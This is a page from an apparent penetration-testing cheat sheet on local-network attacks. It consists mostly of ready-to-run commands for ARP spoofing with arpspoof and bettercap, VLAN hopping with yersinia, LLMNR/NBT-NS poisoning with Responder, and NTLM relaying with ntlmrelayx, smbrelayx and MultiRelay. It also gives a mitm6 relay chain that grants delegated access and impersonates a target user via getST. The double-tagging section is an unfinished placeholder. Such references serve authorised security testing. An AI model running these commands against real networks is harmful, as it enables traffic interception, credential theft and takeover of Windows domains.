---
layout: default
title: LAN Attacks
parent: Attacks
nav_order: 1
---

# LAN Attacks
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## ARP spoofing
Bettercap2
```
arp.spoof on
```
Arpspoof
```
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```



## 802.1Q VLAN

### Dynamic Trunking
```
yersinia -I
# In interactive mode you will need to select a interface first
# Then, you can select the protocol to attack using letter "g"
# Finally, you can select the attack using letter "x"
```

### Attacking specific VLANs
```
# Preparation
modprobe 8021q
vconfig add eth1 250
dhclient eth1.250
ifconfig eth1.250

# Scan
arp-scan -I eth1.250 10.10.1.0/24
```
### Double Tagging

ADD ME


## Relay Attacks - LLMNR, NBT-NS, and mDNS - 

### Responder
Remember to start with 
```
SMB = Off     # Turn this off
HTTP = Off    # Turn this off
```
```
responder -I eth0 -rv
```
```
responder -I eth0 -r -d -w
```
### Relay
#### ntlmrelayx
```
cme smb <CIDR> --gen-relay-list targets.txt
```
```
ntlmrelayx.py -tf targets.txt
```
#### smbrelayx
```
smbrelayx.py -h <target_IP> -c "ipconfig"
```
#### MultiRelay
```
python MultiRelay.py -t <IP target> -u ALL
```

### mitm6
```
mitm6 -d example.local --ignore-nofqdn
```
Relay
```
ntlmrelayx.py -6 -t ldaps://example.local --delegate-access --no-smb-server -wh test-wpad
```
Exploit
```
getST.py -spn cifs/example.local example.local/ADDED_PC\$ -impersonate TARGET_USER
```


### InveighZero
Works from Windows systems:
* [https://github.com/Kevin-Robertson/InveighZero](https://github.com/Kevin-Robertson/InveighZero)